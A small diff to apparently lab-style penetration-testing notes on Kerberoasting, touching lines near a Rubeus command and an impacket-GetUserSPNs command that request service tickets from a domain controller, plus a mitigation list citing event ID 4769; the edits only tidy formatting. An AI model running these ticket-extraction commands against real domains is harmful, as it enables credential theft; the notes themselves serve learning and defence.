@@ -29,7 +29,6 @@ rubeus.exe kerberoast /domain:MARVEL.local /creduser:MARVEL.local\fcastle /credp
 using impacket-GetUserSPNs :
 ```bash
 impacket-GetUserSPNs -request -dc-ip 192.168.44.166 UAP.local/fcastle -save -outputfile GetUserSPNs1.out
-
 ```
 
 using nxc:
@@ -65,7 +64,7 @@ Mitigation :
 - Limit user/group token creation permission
 - Account tiering
 - Local admin restriction
--  Key Windows Event ID: 4769
+- Key Windows Event ID: 4769
 
 
 ```
